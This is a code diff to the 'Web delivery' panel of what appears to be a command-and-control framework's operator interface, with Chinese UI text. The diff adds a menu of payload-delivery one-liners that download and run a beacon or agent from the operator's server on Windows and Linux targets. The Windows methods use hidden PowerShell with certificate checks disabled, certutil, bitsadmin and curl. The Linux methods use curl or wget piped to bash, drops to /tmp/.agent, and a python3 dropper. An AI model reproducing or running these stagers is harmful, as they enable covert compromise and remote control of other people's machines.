@@ -37,7 +37,107 @@ function teamserverApiOrigin(apiBase: string) {
   return ''
 }
 
-/** Agents that can actually callback on this listener for the chosen OS. */
+function withQuery(url: string, q: string) {
+  return `${url}${url.includes('?') ? '&' : '?'}${q}`
+}
+
+function esc(s: string) {
+  return s.replace(/'/g, `'\\''`)
+}
+
+type Method = {
+  id: string
+  title: string
+  desc: string
+  command: (ctx: { script: string; payload: string; scriptPs: string; scriptBash: string }) => string
+}
+
+const WIN_METHODS: Method[] = [
+  {
+    id: 'ps-iex',
+    title: 'PowerShell IEX',
+    desc: '内存拉脚本执行，兼容性最好',
+    command: ({ scriptPs }) =>
+      `powershell -nop -w hidden -c "[Net.ServicePointManager]::ServerCertificateValidationCallback={param($a,$b,$c,$d)[bool]1};[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;iex((New-Object Net.WebClient).DownloadString('${scriptPs}'))"`,
+  },
+  {
+    id: 'ps-iwr',
+    title: 'PowerShell IWR',
+    desc: '下载 exe 到临时目录再启动',
+    command: ({ payload }) =>
+      `powershell -nop -w hidden -c "[Net.ServicePointManager]::ServerCertificateValidationCallback={param($a,$b,$c,$d)[bool]1};[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;$p=Join-Path $env:TEMP ('b'+[guid]::NewGuid().ToString('N').Substring(0,8)+'.exe');iwr -UseBasicParsing '${payload}' -OutFile $p;Start-Process $p -WindowStyle Hidden"`,
+  },
+  {
+    id: 'cmd-curl',
+    title: 'cmd + curl',
+    desc: 'Win10+ 自带 curl.exe 下载执行',
+    command: ({ payload }) =>
+      `cmd /c "curl.exe -skL --http1.1 -o %TEMP%\\beacon.exe ${payload} && start /b %TEMP%\\beacon.exe"`,
+  },
+  {
+    id: 'certutil',
+    title: 'certutil',
+    desc: '系统自带下载；自签证书可能失败',
+    command: ({ payload }) =>
+      `cmd /c "certutil -urlcache -split -f ${payload} %TEMP%\\beacon.exe && start /b %TEMP%\\beacon.exe"`,
+  },
+  {
+    id: 'bitsadmin',
+    title: 'bitsadmin',
+    desc: 'BITS 后台传输；自签证书可能失败',
+    command: ({ payload }) =>
+      `cmd /c "bitsadmin /transfer j /download /priority high ${payload} %TEMP%\\beacon.exe && start /b %TEMP%\\beacon.exe"`,
+  },
+  {
+    id: 'download',
+    title: '直接下载',
+    desc: '浏览器保存 beacon.exe，自己拷到目标机',
+    command: ({ payload }) => payload,
+  },
+]
+
+const LINUX_METHODS: Method[] = [
+  {
+    id: 'curl-bash',
+    title: 'curl | bash',
+    desc: '拉脚本执行，最常用',
+    command: ({ scriptBash }) => `curl -skL --http1.1 '${esc(scriptBash)}' | bash`,
+  },
+  {
+    id: 'wget-bash',
+    title: 'wget | bash',
+    desc: '没有 curl 时用 wget',
+    command: ({ scriptBash }) => `wget -qO- --no-check-certificate '${esc(scriptBash)}' | bash`,
+  },
+  {
+    id: 'curl-exec',
+    title: 'curl 下载执行',
+    desc: '落到 /tmp 再 chmod 启动',
+    command: ({ payload }) =>
+      `curl -skL --http1.1 '${esc(payload)}' -o /tmp/.agent && chmod +x /tmp/.agent && /tmp/.agent &`,
+  },
+  {
+    id: 'wget-exec',
+    title: 'wget 下载执行',
+    desc: '落到 /tmp 再 chmod 启动',
+    command: ({ payload }) =>
+      `wget -q --no-check-certificate '${esc(payload)}' -O /tmp/.agent && chmod +x /tmp/.agent && /tmp/.agent &`,
+  },
+  {
+    id: 'python',
+    title: 'python3',
+    desc: '没有 curl/wget 时用标准库',
+    command: ({ payload }) =>
+      `python3 -c "import ssl,urllib.request,os,subprocess,tempfile;ctx=ssl._create_unverified_context();p=tempfile.mktemp();open(p,'wb').write(urllib.request.urlopen('${payload}',context=ctx).read());os.chmod(p,0o755);subprocess.Popen([p])"`,
+  },
+  {
+    id: 'download',
+    title: '直接下载',
+    desc: '浏览器保存 agent.elf，自己拷到目标机',
+    command: ({ payload }) => payload,
+  },
+]
+
 function agentsForListener(reg?: string, target?: Target): string[] {
   const r = String(reg || '')
   if (r === 'BeaconHTTP' || r === 'BeaconDNS') return target === 'linux' ? [] : ['beacon']
@@ -87,6 +187,7 @@ export function WebDelivery() {
   const [agentName, setAgentName] = useState('beacon')
   const [format, setFormat] = useState('Exe')
   const [target, setTarget] = useState<Target>('windows')
+  const [methodId, setMethodId] = useState('ps-iex')
   const [sleep, setSleep] = useState('5s')
   const [jitter, setJitter] = useState(20)
   const [busy, setBusy] = useState(false)
@@ -98,6 +199,8 @@ export function WebDelivery() {
   const lastTarget = useRef(target)
 
   const profile = AGENT_PROFILES.find((p) => p.agent === agentName) || AGENT_PROFILES[0]
+  const methods = target === 'linux' ? LINUX_METHODS : WIN_METHODS
+  const method = methods.find((m) => m.id === methodId) || methods[0]
 
   const compatible = useMemo(() => {
     return listenerList.filter((l) => agentsForListener(l.l_reg_name, target).length > 0)
@@ -120,6 +223,10 @@ export function WebDelivery() {
   useEffect(() => {
     const targetChanged = lastTarget.current !== target
     lastTarget.current = target
+    const nextDefault = target === 'linux' ? 'curl-bash' : 'ps-iex'
+    if (targetChanged || !methods.some((m) => m.id === methodId)) {
+      setMethodId(nextDefault)
+    }
     if (!compatible.length) {
       if (listener) setListener('')
       return
@@ -190,16 +297,12 @@ export function WebDelivery() {
 
   const scriptUrl = useMemo(() => joinUrl(c2Host, SCRIPT_ROUTE), [c2Host])
   const payloadUrl = useMemo(() => joinUrl(c2Host, PAYLOAD_ROUTE), [c2Host])
-  const scriptPs = useMemo(() => `${scriptUrl}${scriptUrl.includes('?') ? '&' : '?'}d=ps`, [scriptUrl])
-  const scriptBash = useMemo(() => `${scriptUrl}${scriptUrl.includes('?') ? '&' : '?'}d=bash`, [scriptUrl])
-
-  const winCmd = useMemo(
-    () =>
-      `powershell -nop -w hidden -c "[Net.ServicePointManager]::ServerCertificateValidationCallback={param($a,$b,$c,$d)[bool]1};[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;iex((New-Object Net.WebClient).DownloadString('${scriptPs}'))"`,
-    [scriptPs],
-  )
-  const linuxCmd = useMemo(() => `curl -skL --http1.1 '${scriptBash}' | bash`, [scriptBash])
-  const command = target === 'linux' ? linuxCmd : winCmd
+  const scriptPs = useMemo(() => withQuery(scriptUrl, 'd=ps'), [scriptUrl])
+  const scriptBash = useMemo(() => withQuery(scriptUrl, 'd=bash'), [scriptUrl])
+  const command = useMemo(() => {
+    if (!c2Host) return '等待登录后生成命令…'
+    return method.command({ script: scriptUrl, payload: payloadUrl, scriptPs, scriptBash })
+  }, [c2Host, method, scriptUrl, payloadUrl, scriptPs, scriptBash])
 
   async function onEnable() {
     if (!listener) {
@@ -268,141 +371,160 @@ export function WebDelivery() {
         <div className="card-hd">
           <h3>Web 投递</h3>
           <span className="spacer" />
+          <span className="dim" style={{ fontSize: 12 }}>
+            {statusText}
+            {selected ? ` · ${selected.l_name} / ${agentName}` : ''}
+          </span>
           <span className={`wd-pill ${enabled ? 'on' : ''}`}>{enabled ? '已启用' : '未启用'}</span>
         </div>
         <div className="card-bd wd-body">
-          {pluginMissing && (
-            <div className="hint warn-hint" style={{ marginBottom: 12 }}>
-              服务端未加载 webdelivery 插件。
-            </div>
-          )}
+          <div className="wd-col wd-col-setup">
+            {pluginMissing && (
+              <div className="hint warn-hint">服务端未加载 webdelivery 插件。</div>
+            )}
 
-          <div className="wd-step">1. 目标</div>
-          <div className="chip-row">
-            <button type="button" className={target === 'windows' ? 'primary' : ''} onClick={() => setTarget('windows')}>
-              Windows · Beacon
-            </button>
-            <button type="button" className={target === 'linux' ? 'primary' : ''} onClick={() => setTarget('linux')}>
-              Linux · Agent
-            </button>
-          </div>
-          <div className="hint muted-hint" style={{ marginTop: 6 }}>
-            {target === 'linux'
-              ? '配对：Linux Agent → BeaconWS（HTTP Upgrade）。没有独立的 LinuxHTTP。'
-              : '配对：Windows Beacon → BeaconHTTP。复制命令到目标机器执行。'}
-          </div>
-
-          <div className="wd-step">2. 监听</div>
-          {compatible.length === 0 ? (
-            <div className="hint warn-hint">
-              没有可用监听
-              <button className="ghost" style={{ marginLeft: 8 }} onClick={() => { setTab('listeners'); openUiTab('listeners') }}>
-                去创建
+            <div className="wd-step">1. 目标</div>
+            <div className="chip-row">
+              <button type="button" className={target === 'windows' ? 'primary' : ''} onClick={() => setTarget('windows')}>
+                Windows · Beacon
+              </button>
+              <button type="button" className={target === 'linux' ? 'primary' : ''} onClick={() => setTarget('linux')}>
+                Linux · Agent
               </button>
             </div>
-          ) : (
-            <div className="gen-listener-list">
-              {compatible.map((l) => (
-                <button
-                  key={l.l_name}
-                  type="button"
-                  className={`gen-listener ${listener === l.l_name ? 'active' : ''}`}
-                  onClick={() => applyListener(l.l_name, target, agentName)}
-                >
-                  <span className={`tag ${String(l.l_status).toLowerCase().includes('listen') ? 'listen' : 'offline'}`}>
-                    {l.l_status || '-'}
-                  </span>
-                  <div className="meta">
-                    <div className="name mono">{l.l_name}</div>
-                    <div className="sub">
-                      {l.l_reg_name} · {l.l_bind_host}:{l.l_bind_port}
-                      {listenerHint(l.l_reg_name) ? ` · ${listenerHint(l.l_reg_name)}` : ''}
-                    </div>
-                  </div>
-                </button>
-              ))}
+            <div className="hint muted-hint">
+              {target === 'linux'
+                ? '配对：Linux Agent → BeaconWS（HTTP Upgrade）。没有独立的 LinuxHTTP。'
+                : '配对：Windows Beacon → BeaconHTTP。选一种上线方式，复制到目标机执行。'}
             </div>
-          )}
 
-          {agentChoices.length > 1 && (
-            <>
-              <div className="wd-step">Agent</div>
-              <div className="chip-row">
-                {agentChoices.map((a) => (
+            <div className="wd-step">2. 监听</div>
+            {compatible.length === 0 ? (
+              <div className="hint warn-hint">
+                没有可用监听
+                <button className="ghost" style={{ marginLeft: 8 }} onClick={() => { setTab('listeners'); openUiTab('listeners') }}>
+                  去创建
+                </button>
+              </div>
+            ) : (
+              <div className="gen-listener-list">
+                {compatible.map((l) => (
                   <button
-                    key={a}
+                    key={l.l_name}
                     type="button"
-                    className={agentName === a ? 'primary' : ''}
-                    onClick={() => {
-                      setAgentName(a)
-                      setFormat(defaultFormat(a, target))
-                    }}
+                    className={`gen-listener ${listener === l.l_name ? 'active' : ''}`}
+                    onClick={() => applyListener(l.l_name, target, agentName)}
                   >
-                    {a === 'linux' ? 'Linux Agent' : a === 'gopher' ? 'Gopher' : 'Beacon'}
+                    <span className={`tag ${String(l.l_status).toLowerCase().includes('listen') ? 'listen' : 'offline'}`}>
+                      {l.l_status || '-'}
+                    </span>
+                    <div className="meta">
+                      <div className="name mono">{l.l_name}</div>
+                      <div className="sub">
+                        {l.l_reg_name} · {l.l_bind_host}:{l.l_bind_port}
+                        {listenerHint(l.l_reg_name) ? ` · ${listenerHint(l.l_reg_name)}` : ''}
+                      </div>
+                    </div>
                   </button>
                 ))}
               </div>
-            </>
-          )}
+            )}
 
-          <div className="wd-step">3. 上线</div>
-          <div className="wd-cmd-box">
-            <textarea className="wd-cmd mono" readOnly rows={3} value={c2Host ? command : '等待登录后生成命令…'} />
-            <div className="wd-cmd-actions">
-              <button className="primary" disabled={busy || !listener} onClick={onEnable}>
-                {busy ? '同步中…' : enabled ? '重新启用' : '启用投递'}
-              </button>
-              <button className="primary" disabled={!c2Host} onClick={copyCmd}>复制命令</button>
-              <button disabled={!c2Host} onClick={downloadPayload}>直接下载载荷</button>
-              <button disabled={busy} onClick={() => loadStatus()}>刷新</button>
-            </div>
-          </div>
-
-          <div className="hint muted-hint" style={{ marginTop: 10 }}>
-            {statusText}
-            {serverLine ? `（服务端 ${serverLine}）` : ''}
-            {selected ? ` · 本页 ${selected.l_name} / ${agentName} / ${format}` : ''}
-            {enabled && selected && serverLine && !serverLine.startsWith(`${selected.l_name} ·`)
-              ? ' · 点启用后才会改成当前选择'
-              : ''}
-            <br />
-            脚本 <code className="mono">{c2Host || '…'}/deliver</code>
-            {' '}载荷 <code className="mono">{c2Host || '…'}/deliver/payload</code>
-          </div>
-
-          <button className="ghost" style={{ marginTop: 12 }} onClick={() => setAdvanced((v) => !v)}>
-            {advanced ? '收起高级' : '高级'}
-          </button>
-          {advanced && (
-            <div className="wd-advanced">
-              <div className="field">
-                <label>格式</label>
+            {agentChoices.length > 1 && (
+              <>
+                <div className="wd-step">Agent</div>
                 <div className="chip-row">
-                  {profile.formats.filter((f) => f !== 'Stager' && !/Shellcode|Hex|DLL|Shared/i.test(f)).map((f) => (
-                    <button key={f} type="button" className={format === f ? 'primary' : ''} onClick={() => setFormat(f)}>
-                      {f}
+                  {agentChoices.map((a) => (
+                    <button
+                      key={a}
+                      type="button"
+                      className={agentName === a ? 'primary' : ''}
+                      onClick={() => {
+                        setAgentName(a)
+                        setFormat(defaultFormat(a, target))
+                      }}
+                    >
+                      {a === 'linux' ? 'Linux Agent' : a === 'gopher' ? 'Gopher' : 'Beacon'}
                     </button>
                   ))}
                 </div>
-              </div>
-              <div className="field">
-                <label>Sleep / Jitter</label>
-                <div style={{ display: 'flex', gap: 8 }}>
-                  <input style={{ flex: 1 }} value={sleep} onChange={(e) => setSleep(e.target.value)} />
-                  {agentName === 'beacon' && (
-                    <input
-                      type="number"
-                      min={0}
-                      max={100}
-                      style={{ width: 90 }}
-                      value={jitter}
-                      onChange={(e) => setJitter(Number(e.target.value))}
-                    />
-                  )}
+              </>
+            )}
+
+            <div className="wd-setup-actions">
+              <button className="primary" disabled={busy || !listener} onClick={onEnable}>
+                {busy ? '同步中…' : enabled ? '重新启用' : '启用投递'}
+              </button>
+              <button disabled={busy} onClick={() => loadStatus()}>刷新状态</button>
+            </div>
+
+            <button className="ghost wd-adv-toggle" onClick={() => setAdvanced((v) => !v)}>
+              {advanced ? '收起高级' : '高级'}
+            </button>
+            {advanced && (
+              <div className="wd-advanced">
+                <div className="field">
+                  <label>格式</label>
+                  <div className="chip-row">
+                    {profile.formats.filter((f) => f !== 'Stager' && !/Shellcode|Hex|DLL|Shared/i.test(f)).map((f) => (
+                      <button key={f} type="button" className={format === f ? 'primary' : ''} onClick={() => setFormat(f)}>
+                        {f}
+                      </button>
+                    ))}
+                  </div>
+                </div>
+                <div className="field">
+                  <label>Sleep / Jitter</label>
+                  <div style={{ display: 'flex', gap: 8 }}>
+                    <input style={{ flex: 1 }} value={sleep} onChange={(e) => setSleep(e.target.value)} />
+                    {agentName === 'beacon' && (
+                      <input
+                        type="number"
+                        min={0}
+                        max={100}
+                        style={{ width: 90 }}
+                        value={jitter}
+                        onChange={(e) => setJitter(Number(e.target.value))}
+                      />
+                    )}
+                  </div>
                 </div>
               </div>
+            )}
+          </div>
+
+          <div className="wd-col wd-col-run">
+            <div className="wd-step">3. 上线方式</div>
+            <div className="wd-methods">
+              {methods.map((m) => (
+                <button
+                  key={m.id}
+                  type="button"
+                  className={`wd-method ${methodId === m.id ? 'active' : ''}`}
+                  onClick={() => setMethodId(m.id)}
+                >
+                  <b>{m.title}</b>
+                  <span>{m.desc}</span>
+                </button>
+              ))}
             </div>
-          )}
+
+            <div className="wd-cmd-box">
+              <textarea className="wd-cmd mono" readOnly value={command} />
+              <div className="wd-cmd-actions">
+                <button className="primary" disabled={!c2Host} onClick={copyCmd}>复制命令</button>
+                <button disabled={!c2Host} onClick={downloadPayload}>直接下载载荷</button>
+              </div>
+              <div className="hint muted-hint wd-url-hint">
+                脚本 <code className="mono">{c2Host || '…'}/deliver</code>
+                {' '}载荷 <code className="mono">{c2Host || '…'}/deliver/payload</code>
+                {serverLine ? ` · 服务端 ${serverLine}` : ''}
+                {enabled && selected && serverLine && !serverLine.startsWith(`${selected.l_name} ·`)
+                  ? ' · 点启用后才会改成当前选择'
+                  : ''}
+              </div>
+            </div>
+          </div>
         </div>
       </div>
     </div>
